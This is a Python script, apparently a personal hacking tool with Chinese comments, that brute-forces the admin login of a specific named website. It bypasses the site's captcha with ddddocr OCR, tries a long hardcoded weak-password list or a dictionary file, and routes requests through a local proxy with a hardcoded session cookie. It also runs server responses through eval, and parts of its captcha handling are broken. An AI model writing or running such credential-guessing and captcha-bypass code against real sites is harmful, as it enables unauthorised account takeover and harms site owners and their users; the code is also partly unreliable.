import requests
import base64
import json
import ddddocr
import os
import sys
path = os.path.dirname(os.path.abspath(__file__))
requests.packages.urllib3.disable_warnings()
ocr = ddddocr.DdddOcr()
proxies = {"http": "http://127.0.0.1:10809"}#代理
print(f'''
--------------------------
main.py -r        #弱口令
main.py xxx.txt   #字典爆破
默认使用的代理:{proxies}
''')
# url="https://agent.dgs-zopqucm.com/agent/#/"
url="https://agent.dgs-zopqucm.com/user/login"
def userpassbp(result,file,ints): #爆破
    headersbp = {
        'Cookie': 'PHPSESSID=9cee9522237b174d1bb39e30be105cd5',
        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0",
        'Accept': 'application/json, text/plain, */*',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://agent.dgs-zopqucm.com',
        'Referer': 'https://agent.dgs-zopqucm.com/agent/',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
    }
    data={
    "username": "admin",
    "password": file,
    "code": result
    }
    respb=requests.post(url=url,headers=headersbp,data=data,timeout=10,verify=False).text
    dirlis=eval(respb)
    login=str(dirlis["message"])
    if login=="验证码错误，请重试" or login=="账号或密码错误":
        print(f"[{ints}]当前账号:{data['username']}当前密码:{data['password']}当前验证码:{data['code']}----{dirlis['message']}")
    else:
        print('登录成功')
        exit()


def get_captcha():
    """
    获取验证码
    """
    url = "https://agent.dgs-zopqucm.com/user/code?code=1680090673780"

    headersocr = {
        'Cookie': 'PHPSESSID=9cee9522237b174d1bb39e30be105cd5',
        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0",
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Referer': 'https://agent.dgs-zopqucm.com/user/code?code=1680090673780',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Te': 'trailers'
    }
    resp = requests.get(url=url, headers=headersocr,timeout=10,verify=False,proxies=proxies)
    print(resp.text)
    # if resp.status_code == 200:
    #     return resp.content
    # else:
    #     print("接口返回值不是200")
    #     # print(resp.status_code)


def save_img(img_bytes): 
    """
    保存图片到本地
    """
    filepath = path+"\\img\\1.png"
    with open(file=filepath, mode="wb") as f:
        f.write(img_bytes)
    return filepath


def get_file_base64(filePath):
    """
    文件编码为 base64
    """
    with open(filePath, 'rb') as f:
        image = f.read()
        image_base64 = str(base64.b64encode(image))
        return image_base64

def ddddocrs(imgs):
    with open(imgs, 'rb') as f:     # 打开图片
        img_bytes = f.read()             # 读取图片
    res = ocr.classification(img_bytes)  # 识别
    #打印验证码
    return res

def run():
    # 1获取验证码图片
    img_bytes = get_captcha()
    # 2保存图片
    img_path = save_img(img_bytes)
    # 4图片base64编码
    image = get_file_base64(img_path)
    # 5识别图片

def roulin():#弱口令
    ints=0
    pwdUnSecurity = ["123456", "123456789", "111111", "5201314", "12345678", "123123", "password", "1314520", "123321", "7758521", "1234567", "5211314", "666666", "520520", "woaini", "520131", "11111111", "888888", "hotmail.com", "112233", "123654", "654321", "1234567890", "a123456", "88888888", "163.com", "000000", "yahoo.com.cn", "sohu.com", "yahoo.cn", "111222tianya", "163.COM", "tom.com", "139.com", "wangyut2", "pp.com", "yahoo.com", "147258369", "123123123", "147258", "987654321", "100200", "zxcvbnm", "123456a", "521521", "7758258", "111222", "110110", "1314521", "11111111", "12345678", "a321654", "111111", "123123", "5201314", "00000000", "q123456", "123123123", "aaaaaa", "a123456789", "qq123456", "11112222", "woaini1314", "a123123", "a111111", "123321", "a5201314", "z123456", "liuchang", "a000000", "1314520", "asd123", "88888888", "1234567890", "7758521", "1234567", "woaini520", "147258369", "123456789a", "woaini123", "q1q1q1q1", "a12345678", "qwe123", "123456q", "121212", "asdasd", "999999", "1111111", "123698745", "137900", "159357", "iloveyou", "222222", "31415926", "123456", "111111", "123456789", "123123", "9958123", "woaini521", "5201314", "18n28n24a5", "abc123", "password", "123qwe", "123456789", "12345678", "11111111", "dearbook", "00000000", "123123123", "1234567890", "88888888", "111111111", "147258369", "987654321", "aaaaaaaa", "1111111111", "66666666", "a123456789", "11223344", "1qaz2wsx", "xiazhili", "789456123", "password", "87654321", "qqqqqqqq", "000000000", "qwertyuiop", "qq123456", "iloveyou", "31415926", "12344321", "0000000000", "asdfghjkl", "1q2w3e4r", "123456abc", "0123456789", "123654789", "12121212", "qazwsxedc", "abcd1234", "12341234", "110110110", "asdasdasd", "123456", "22222222", "123321123", "abc123456", "a12345678", "123456123", "a1234567", "1234qwer", "qwertyui", "123456789a", "qq.com", "369369", "163.com", "ohwe1zvq", "xiekai1121", "19860210", "1984130", "81251310", "502058", "162534", "690929", "601445", "1814325", "as1230", "zz123456", "280213676", "198773", "4861111", "328658", "19890608", "198428", "880126", "6516415", "111213", "195561", "780525", "6586123", "caonima99", "168816", "123654987", "qq776491", "hahabaobao", "198541", "540707", "leqing123", "5403693", "123456", "123456789", "111111", "5201314", "123123", "12345678", "1314520", "123321", "7758521", "1234567", "5211314", "520520", "woaini", "520131", "666666", "RAND#a#8", "hotmail.com", "112233", "123654", "888888", "654321", "1234567890", "a123456"];
    for ro in range(len(pwdUnSecurity)): #字典pwdUnSecurity[i]
        file=pwdUnSecurity[ro]
        run()
        ints+=1
        imgs = path+"\\img\\1.png"
        code = ddddocrs(imgs) #验证码存到code
        userpassbp(code,file,ints) #吧字典,和验证码,传给爆破
def dirzid(lks):#字典爆破
    ints=0
    for file in open(path+lks,'r',encoding="utf-8"):
        file=file.replace('\n', '')
        run()
        ints+=1
        imgs = path+"\\img\\1.png"
        code = ddddocrs(imgs) #验证码存到code
        userpassbp(code,file,ints) #吧字典,和验证码,传给爆破
if __name__ == '__main__':
    # if sys.argv[1]=='-r':
        roulin()
        if sys.argv[1]!="-r":
            lks=sys.argv[1]
            dirzid(lks)